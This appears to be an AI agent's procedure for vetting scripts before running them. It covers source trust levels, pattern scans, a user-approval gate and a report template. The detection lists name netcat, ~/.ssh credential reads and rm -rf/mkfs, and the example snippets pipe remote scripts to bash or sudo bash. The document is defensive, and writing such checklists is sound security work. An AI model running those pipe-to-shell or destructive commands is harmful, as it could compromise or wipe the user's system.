# Script Verification and Safe Execution Context

## Overview
Verify scripts from URLs or local files for safety before execution to prevent malicious code running.

## Goal
Provide a systematic security review process for scripts before execution, protecting the system from malicious code, unauthorized access, data exfiltration, or system damage. This procedure establishes a multi-layer verification approach combining automated checks with human oversight.

## Triggers
When should an AI agent invoke this procedure?
- User provides a URL to a script and asks to run it
- User requests downloading and executing an installation script
- Installing software via curl/wget piped to shell (e.g., `curl URL | bash`)
- Running scripts from untrusted or unknown sources
- Executing local scripts that weren't created by the user
- Any situation involving external code execution
- Before running scripts from tutorials, Stack Overflow, or similar sources

## Prerequisites
Required before running:
- Script source available (URL or local file path)
- Internet connection (if downloading from URL)
- `curl` or `wget` installed for downloading scripts
- Text viewing/analysis tools available (`cat`, `grep`, `less`)
- User is available for approval decisions
- Understanding of basic shell scripting concepts (for AI analysis)

## Logic
Step-by-step verification flow:

### 1. Source Identification
- Determine if script is from URL or local file
- For URLs: Check domain reputation and HTTPS usage
- For local files: Check file ownership and permissions

### 2. Initial Download/Preview (Don't Execute Yet!)
- Download script to temporary location (if from URL)
- Read script contents without executing
- Calculate file hash for verification if available

### 3. Automated Security Analysis
Scan for suspicious patterns:
- **Network activity:** `curl`, `wget`, `nc`, `netcat`, `telnet`, outbound connections
- **Privilege escalation:** `sudo`, `su`, `chmod +s`, SUID operations
- **System modification:** Writing to `/etc/`, `/usr/`, `/bin/`, system directories
- **Data exfiltration:** Base64 encoding, unusual network traffic, data uploads
- **Obfuscation:** Excessive encoding, hexadecimal strings, `eval`, code generation
- **Destructive commands:** `rm -rf`, `dd`, `mkfs`, filesystem operations
- **Credential access:** Reading `~/.ssh/`, password files, key material
- **Hidden behavior:** Backgrounding (`&`), nohup, cron job creation
- **Package installation:** `apt install`, `pip install`, `npm install` from unknown sources

### 4. Source Trust Evaluation
- **High trust:** Official repositories (github.com/docker, get.docker.com, etc.)
- **Medium trust:** Known projects with good reputation
- **Low trust:** Personal blogs, pastebin, unknown domains
- **No trust:** Suspicious domains, IP addresses, obfuscated URLs

### 5. User Presentation
Present findings to user:
- Script source and trust level
- Summary of what the script does
- List of suspicious patterns found (if any)
- Security risks identified
- Recommendation (SAFE / REVIEW / DANGEROUS / DO NOT RUN)

### 6. User Decision
- **User approves:** Proceed with execution (log decision)
- **User declines:** Abort, offer alternatives
- **User requests review:** Show full script for manual inspection

### 7. Safe Execution (if approved)
- Log script execution for audit trail
- Run with appropriate permissions (avoid sudo unless necessary)
- Monitor execution for unexpected behavior
- Capture output for review

## Related Files
- `context/change_log.md` - Log script executions for audit
- `procedures/validate_config/` - Similar validation philosophy
- `installation_bundles/*/procedure.md` - May contain approved scripts
- `.gitignore` - Don't commit downloaded scripts to repository

## AI Agent Notes
- **Auto-run Safety:** NEVER AUTO-RUN - ALWAYS require explicit user approval
- **User Interaction:**
  - **CRITICAL:** Show full analysis before asking for approval
  - Present risks clearly and honestly
  - Never downplay security concerns
  - Offer to show full script content
  - Explain what script does in plain language
  - Default to DECLINE unless user explicitly approves
  
- **Common Patterns to Flag:**
  ```bash
  # DANGEROUS - Direct pipe to shell
  curl https://example.com/script.sh | bash
  
  # SUSPICIOUS - Obfuscated code
  eval $(echo SGVsbG8gV29ybGQ= | base64 -d)
  
  # RISKY - Sudo without review
  curl URL | sudo bash
  
  # QUESTIONABLE - Modifying system
  echo "something" >> /etc/hosts
  ```

- **Common Failures:**
  - URL returns 404 → Report to user, don't proceed
  - Script too large to analyze → Warn user, offer partial review
  - Mixed encoding → Flag as suspicious obfuscation
  - Network timeout → Retry with user permission

- **Edge Cases:**
  - Script modifies itself during execution → High risk flag
  - Multiple scripts chained → Analyze all in chain
  - Conditional execution based on detection → Sandbox recommended
  - Scripts that download more scripts → Recursive analysis needed
  - Known good scripts (Docker, NVM, etc.) → Still review but note provenance

- **Error Handling:**
  - If can't download script, fail safely with error message
  - If script analysis fails, default to DANGEROUS
  - If uncertain about pattern, flag for user review
  - Never execute if any step fails

- **Security Best Practices:**
  - **Principle of Least Privilege:** Avoid sudo unless absolutely necessary
  - **Defense in Depth:** Multiple checks better than one
  - **Explicit Over Implicit:** Require clear user approval
  - **Transparency:** Always show what you're checking
  - **Auditability:** Log all script executions
  - **Reversibility:** Prefer scripts that can be undone

- **Approved Source Examples:**
  - `https://get.docker.com` - Docker's official install script
  - `https://raw.githubusercontent.com/nvm-sh/nvm/*/install.sh` - NVM installer
  - Official package managers (apt, yum, dnf, pacman)
  - Scripts from this repository's installation_bundles/

- **Red Flags (Automatic DANGEROUS classification):**
  - Domain is an IP address
  - Script uses `eval` with external input
  - Excessive base64 or hex encoding
  - Downloads and executes additional scripts without showing them
  - Modifies system files in /etc/, /usr/, /bin/
  - Creates backdoors or reverse shells
  - Disables security features (firewall, SELinux, etc.)
  - Runs as root without clear necessity

- **Response Templates:**
  ```
  ⚠️  SECURITY ANALYSIS: DANGEROUS
  Source: https://suspicious-site.com/script.sh
  Trust Level: UNTRUSTED
  
  Risks Found:
  - Downloads additional script (hidden behavior)
  - Modifies /etc/sudoers (privilege escalation)
  - Opens network connection to 1.2.3.4 (data exfiltration)
  - Uses base64 encoding (obfuscation)
  
  Recommendation: DO NOT RUN
  This script exhibits malicious patterns.
  ```

- **Alternative Approaches:**
  - Suggest official installation methods instead
  - Offer to build from source with verification
  - Recommend using package managers when available
  - Provide manual installation steps as alternative
